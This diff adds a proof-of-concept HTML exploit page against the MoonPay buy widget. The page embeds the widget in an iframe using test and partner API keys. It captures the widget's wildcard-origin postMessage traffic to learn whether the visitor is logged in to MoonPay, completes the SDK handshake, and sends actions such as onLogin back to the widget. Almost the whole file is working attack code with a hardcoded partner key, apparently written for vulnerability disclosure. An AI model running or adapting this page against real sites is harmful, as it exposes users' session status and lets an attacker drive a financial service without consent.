@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>PoC - MoonPay PostMessage Information Disclosure</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
+  .log { white-space: pre-wrap; margin: 5px 0; padding: 5px; background: #16213e; border-left: 3px solid #0f0; font-size: 12px; }
+  .log.error { border-left-color: #f00; color: #f44; }
+  .log.warn { border-left-color: #ff0; color: #ff0; }
+  .log.info { border-left-color: #0af; color: #0af; }
+  .log.success { border-left-color: #0f0; color: #0f0; }
+  .log.critical { border-left-color: #f0f; color: #f0f; font-weight: bold; }
+  button { background: #0f0; color: #000; border: none; padding: 8px 15px; cursor: pointer; margin: 3px; font-family: monospace; font-weight: bold; font-size: 12px; }
+  button:hover { background: #0a0; }
+  h1 { color: #0af; font-size: 18px; }
+  h3 { color: #f80; font-size: 13px; margin: 10px 0 5px; }
+  #output { max-height: 500px; overflow-y: auto; border: 1px solid #333; padding: 5px; }
+  iframe { border: 2px solid #0af; }
+  .section { background: #0d1117; padding: 10px; margin: 10px 0; border: 1px solid #333; }
+  .finding { color: #aaa; font-size: 12px; margin: 5px 0; }
+  code { background: #333; padding: 2px 5px; }
+</style>
+</head>
+<body>
+<h1>PoC: MoonPay PostMessage Wildcard Target Origin - Information Disclosure</h1>
+
+<div class="section">
+  <h3>Step 1: Embed Target</h3>
+  <button onclick="embedWithTestKey()">Embed with pk_test key (frame-ancestors *)</button>
+  <button onclick="embedSandbox()">Embed buy-sandbox (no CSP)</button>
+  <button onclick="embedWithTelegramTestKey()">Embed with Telegram partner test key</button>
+  <div id="iframe-container"></div>
+</div>
+
+<div class="section">
+  <h3>Step 2: Respond to Handshake (auto-enabled)</h3>
+  <button onclick="sendHandshakeResponse()">Manual: Send Handshake Response</button>
+  <button onclick="sendSdkAction('onLogin', {isRefresh: false})">Send: onLogin</button>
+  <button onclick="sendSdkAction('onClose', {})">Send: onClose</button>
+</div>
+
+<div class="section">
+  <h3>Output (listening for all postMessage from widget)</h3>
+  <div id="output"></div>
+</div>
+
+<script>
+let targetWindow = null;
+let handshakeCorrelationId = null;
+let handshakeCompleted = false;
+
+function log(msg, type = '') {
+  const el = document.createElement('div');
+  el.className = 'log ' + type;
+  el.textContent = `[${new Date().toISOString().split('T')[1].slice(0,12)}] ${msg}`;
+  document.getElementById('output').prepend(el);
+}
+
+// ===== MESSAGE LISTENER =====
+// The widget sends ALL messages via postMessage(data, '*') — wildcard target origin
+// This means ANY embedding page receives all messages
+
+window.addEventListener('message', (e) => {
+  if (e.origin !== 'https://buy.moonpay.com' && e.origin !== 'https://buy-sandbox.moonpay.com') return;
+
+  const dataStr = typeof e.data === 'string' ? e.data : JSON.stringify(e.data, null, 2);
+
+  // Classify the message
+  if (typeof e.data === 'object') {
+    if (e.data.type === 'MOONPAY_READY') {
+      log(`[FINDING 1] MOONPAY_READY received — widget confirmed active in our iframe\nOrigin: ${e.origin}\nData: ${dataStr}`, 'critical');
+      return;
+    }
+    if (e.data.type === 'LOGGED_IN_USER') {
+      log(`[FINDING 2 - AUTH LEAK] User IS LOGGED IN to MoonPay!\nOrigin: ${e.origin}\nThis reveals the victim has an active MoonPay session.`, 'critical');
+      return;
+    }
+    if (e.data.type === 'ANONYM_USER') {
+      log(`[FINDING 2 - AUTH LEAK] User is NOT logged in (anonymous)\nOrigin: ${e.origin}`, 'critical');
+      return;
+    }
+  }
+
+  // Parse SDK protocol messages
+  if (typeof e.data === 'string') {
+    try {
+      const parsed = JSON.parse(e.data);
+
+      if (parsed.moonpaySdk && parsed.type === 'request' && parsed.action === '__handshake') {
+        log(`[FINDING 3 - HANDSHAKE] Widget initiated handshake to attacker!\nCorrelation: ${parsed.correlationId}\nSupported versions: ${JSON.stringify(parsed.payload)}`, 'critical');
+        handshakeCorrelationId = parsed.correlationId;
+
+        // Auto-respond to complete the handshake
+        const response = JSON.stringify({
+          appName: 'ramps',
+          moonpaySdk: true,
+          type: 'resolve',
+          correlationId: parsed.correlationId,
+          payload: { version: 1, appVersion: 1 },
+          version: 1
+        });
+        targetWindow.postMessage(response, '*');
+        handshakeCompleted = true;
+        log(`[AUTO] Responded to handshake — bidirectional channel established!`, 'warn');
+        return;
+      }
+
+      if (parsed.moonpaySdk && parsed.type === 'request') {
+        log(`[SDK REQUEST] Widget sent action to attacker: "${parsed.action}"\nPayload: ${JSON.stringify(parsed.payload, null, 2)}`, 'critical');
+        return;
+      }
+
+      if (parsed.moonpaySdk && parsed.type === 'resolve') {
+        log(`[SDK RESPONSE] Received resolve for correlation: ${parsed.correlationId}\nPayload: ${JSON.stringify(parsed.payload, null, 2)}`, 'success');
+        return;
+      }
+
+      if (parsed.moonpaySdk && parsed.type === 'reject') {
+        log(`[SDK REJECT] Action rejected: ${JSON.stringify(parsed.payload)}`, 'error');
+        return;
+      }
+    } catch (err) {}
+  }
+
+  log(`RECEIVED from ${e.origin}:\n${dataStr}`, 'success');
+});
+
+// ===== EMBEDDING FUNCTIONS =====
+
+function createIframe(url, label) {
+  log(`Embedding: ${url}`, 'info');
+  const container = document.getElementById('iframe-container');
+  container.innerHTML = '';
+
+  const iframe = document.createElement('iframe');
+  iframe.src = url;
+  iframe.width = '450';
+  iframe.height = '350';
+  iframe.id = 'target-iframe';
+  container.appendChild(iframe);
+
+  iframe.onload = () => {
+    targetWindow = iframe.contentWindow;
+    log(`iframe loaded (${label}). Listening for messages...`, 'success');
+    log(`Attacker origin: ${window.location.origin}`, 'info');
+  };
+  iframe.onerror = () => log('iframe load error', 'error');
+}
+
+function embedWithTestKey() {
+  // pk_test_123 gives frame-ancestors * on buy.moonpay.com
+  createIframe(
+    'https://buy.moonpay.com?apiKey=pk_test_123&sendAuthStatusToParent=true',
+    'test key + auth status leak'
+  );
+}
+
+function embedSandbox() {
+  // buy-sandbox.moonpay.com has NO CSP headers at all
+  createIframe(
+    'https://buy-sandbox.moonpay.com?apiKey=pk_test_123&sendAuthStatusToParent=true',
+    'sandbox (no CSP)'
+  );
+}
+
+function embedWithTelegramTestKey() {
+  // Telegram partner test key — also gets frame-ancestors *
+  createIframe(
+    'https://buy.moonpay.com?apiKey=pk_test_FHKckSyPyI7zxhPsc2FOzu5b95JSmjB&sendAuthStatusToParent=true',
+    'Telegram partner test key'
+  );
+}
+
+// ===== SDK ACTIONS =====
+
+function sendHandshakeResponse() {
+  if (!targetWindow || !handshakeCorrelationId) {
+    log('No pending handshake to respond to', 'error');
+    return;
+  }
+  const response = JSON.stringify({
+    appName: 'ramps',
+    moonpaySdk: true,
+    type: 'resolve',
+    correlationId: handshakeCorrelationId,
+    payload: { version: 1, appVersion: 1 },
+    version: 1
+  });
+  targetWindow.postMessage(response, '*');
+  log('Sent handshake response', 'info');
+}
+
+function sendSdkAction(action, payload) {
+  if (!targetWindow) { log('Embed target first!', 'error'); return; }
+  if (!handshakeCompleted) { log('Handshake not completed yet — wait for widget to initiate', 'warn'); }
+
+  const msg = JSON.stringify({
+    appName: 'ramps',
+    moonpaySdk: true,
+    type: 'request',
+    action: action,
+    payload: payload || {},
+    version: 1,
+    correlationId: `${Math.random().toString(36).substr(2)}-ramps-${Date.now()}`
+  });
+
+  log(`SENDING action "${action}" to widget:\n${msg}`, 'info');
+  targetWindow.postMessage(msg, '*');
+}
+
+log('PoC ready. Click an embed button to start.', 'info');
+log('All widget postMessages use target origin "*" — we receive everything.', 'warn');
+</script>
+</body>
+</html>
